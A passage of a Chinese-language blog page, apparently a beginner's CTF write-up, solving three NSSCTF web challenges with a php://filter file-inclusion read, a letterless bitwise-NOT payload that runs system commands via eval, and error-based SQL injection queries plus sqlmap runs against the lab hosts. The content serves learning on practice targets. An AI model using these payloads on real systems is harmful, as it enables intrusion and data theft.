@@ -1,0 +1,1118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="luyanpei">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://peig0ng.github.io/posts/37058.html"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web从零开始day2">
+<meta property="og:url" content="https://peig0ng.github.io/posts/37058.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://peig0ng.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-04-24T09:07:05.000Z">
+<meta property="article:modified_time" content="2025-07-04T09:38:49.376Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="train">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://peig0ng.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/lpp.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/lpp.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/lpp.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            web从零开始day2 | lpp_blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"peig0ng.github.io","root":"/","language":"en","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"all_rights_reserved"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/home_banner.jpg","dark":"/images/darkbanner.png"},"title":"祝你开心快乐幸运幸福","subtitle":{"text":["lpp_blog"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/peig0ng/","instagram":null,"zhihu":null,"twitter":null,"email":"2689372361@qq.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"},"Categories":{"icon":"fa-solid fa-folder","path":"/categories/"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"right","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/5/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/fontawesome/light.min.css">
+
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/images/lpp.jpg" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                lpp_blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-solid fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">20</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">web从零开始day2</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/lpp.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">luyanpei</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-04-24 17:07:05</span>
+        <span class="mobile">2025-04-24 17:07:05</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-07-04 17:38:49</span>
+            <span class="mobile">2025-07-04 17:38:49</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/wp/">wp</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/train/">train</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.2k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>11 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="SWPUCTF-2022-新生赛-ez-ez-php"><a href="#SWPUCTF-2022-新生赛-ez-ez-php" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_php"></a>[SWPUCTF 2022 新生赛]ez_ez_php</h2><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure></div>
+
+<p>get传递参数file，如果前三个字符是php进行文件包含</p>
+<p>利用php为协议读取flag.php</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></div>
+
+<p>得到</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCmhlYWRlcigiQ29udGVudC1UeXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7DQoNCg0KZWNobyAgICJOU1NDVEZ7ZmxhZ19pc19ub3RfaGVyZX0iIC4iPGJyLz4iOw0KZWNobyAicmVhbF9mbGFnX2lzX2luXydmbGFnJyIuIjxici8+IjsNCmVjaG8gIuaNouS4quaAnei3r++8jOivleivlVBIUOS8quWNj+iuruWRoiI7DQo=</span><br></pre></td></tr></table></figure></div>
+
+<p>解码</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo   &quot;NSSCTF&#123;flag_is_not_here&#125;&quot; .&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;real_flag_is_in_&#x27;flag&#x27;&quot;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;换个思路，试试PHP伪协议呢&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>直接php伪协议访问flag</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure></div>
+
+<p>得到</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428153432109.png"
+                      alt="image-20250428153432109"
+                ></p>
+<p>解码flag</p>
+<h2 id="SWPUCTF-2021-新生赛-hardrce"><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h2><p>源码</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;wllm&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $wllm = $_GET[&#x27;wllm&#x27;];</span><br><span class="line">    $blacklist = [&#x27; &#x27;,&#x27;\t&#x27;,&#x27;\r&#x27;,&#x27;\n&#x27;,&#x27;\+&#x27;,&#x27;\[&#x27;,&#x27;\^&#x27;,&#x27;\]&#x27;,&#x27;\&quot;&#x27;,&#x27;\-&#x27;,&#x27;\$&#x27;,&#x27;\*&#x27;,&#x27;\?&#x27;,&#x27;\&lt;&#x27;,&#x27;\&gt;&#x27;,&#x27;\=&#x27;,&#x27;\`&#x27;,];</span><br><span class="line">    foreach ($blacklist as $blackitem)</span><br><span class="line">    &#123;</span><br><span class="line">        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $wllm)) &#123;</span><br><span class="line">        die(&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;);</span><br><span class="line">    &#125;&#125;</span><br><span class="line">if(preg_match(&#x27;/[a-zA-Z]/is&#x27;,$wllm))</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;;</span><br><span class="line">eval($wllm);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;蔡总说：注意审题！！！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>get传参接收wllm</p>
+<p>黑名单禁用了[‘ ‘,’\t’,’\r’,’\n’,’+‘,’[‘,’^‘,’]‘,’&quot;‘,’-‘,’$‘,’*‘,’?‘,’&lt;‘,’&gt;‘,’=‘,’`‘,]</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428153652541.png"
+                      alt="image-20250428153652541"
+                ></p>
+<p>还正则禁用了所有字母，无字符rce</p>
+<p>eval可以直接执行php代码</p>
+<p>禁用了^不可以进行异或</p>
+<p>利用php的取反(~)特性</p>
+<p>生成无字符取反payload</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#echo urlencode(~&quot;system&quot;);#%8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="comment">#echo urlencode(~&quot;ls&quot;);#%93%8C</span></span><br><span class="line"><span class="comment">#echo urlencode(~&quot;cat&quot;);#%9C%9E%8B</span></span><br><span class="line"><span class="comment">#echo urlencode(~&quot;flag&quot;);#%99%93%9E%98</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;ls ../&quot;</span>);<span class="comment">#%93%8C%DF%D1%D1%D0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;ls ../../&quot;</span>);<span class="comment">#%93%8C%DF%D1%D1%D0%93%8C%DF%D1%D1%D0%D1%D1%D0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;ls ../../../&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428155821649.png"
+                      alt="image-20250428155821649"
+                ></p>
+<p>最终执行命令测试flag再..&#x2F;..&#x2F;..&#x2F;</p>
+<p>payload</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:29128/?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D1%D1%D0%D1%D1%D0%D1%D1%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428160139137.png"
+                      alt="image-20250428160139137"
+                ></p>
+<h2 id="SWPUCTF-2021-新生赛-error（报错注入）"><a href="#SWPUCTF-2021-新生赛-error（报错注入）" class="headerlink" title="[SWPUCTF 2021 新生赛]error（报错注入）"></a>[SWPUCTF 2021 新生赛]error（报错注入）</h2><p>报错注入</p>
+<p><strong>爆出数据库及相关信息</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428161406143.png"
+                      alt="image-20250428161406143"
+                ></p>
+<p>爆出当前数据表信息</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428161357631.png"
+                      alt="image-20250428161357631"
+                > </p>
+<p><strong>爆user表字段信息</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;test_db&#x27; and table_name=&#x27;users&#x27;),0x7e),1) #</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428161348462.png"
+                      alt="image-20250428161348462"
+                ></p>
+<p>爆test_db表字段信息</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;test_tb&#x27;))),3#</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>爆数据库内容</strong></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from users.password~)),1) #</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428211926313.png"
+                      alt="image-20250428211926313"
+                ></p>
+<p>发现flag查看字段内容</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(id,&#x27;~&#x27;,flag) from test_tb)))#</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428212018025.png"
+                      alt="image-20250428212018025"
+                ></p>
+<p>内容不全，自己设定回显内容</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=extractvalue(1,concat(&#x27;~&#x27;,(select substring(group_concat(id,&#x27;~&#x27;,flag),31,32) from test_tb)))#</span><br></pre></td></tr></table></figure></div>
+
+<p>但是孩子，这样简直是太累了，有sqlmap为何不用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428212202928.png"
+                      alt="image-20250428212202928"
+                ></p>
+<p>拼接NSSCTF{e2fb3e91-8520-48ef-bdbbf-d777358f7fbf}</p>
+<p>sqlmap扫描一下</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://node7.anna.nssctf.cn:24195/index.php?id=1&quot; --batch</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428162254812.png"
+                      alt="image-20250428162254812"
+                ></p>
+<p>可以布尔盲注，报错注入，时间盲注</p>
+<p>查看所有数据库</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://node7.anna.nssctf.cn:24195/index.php?id=1&quot; --dbs --batch</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../images/image-20250428162351000.png"
+                      alt="image-20250428162351000"
+                ></p>
+<p>查看当前数据库：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://node7.anna.nssctf.cn:24195/index.php?id=1&quot; --current-db --batch</span><br></pre></td></tr></table></figure></div>
+
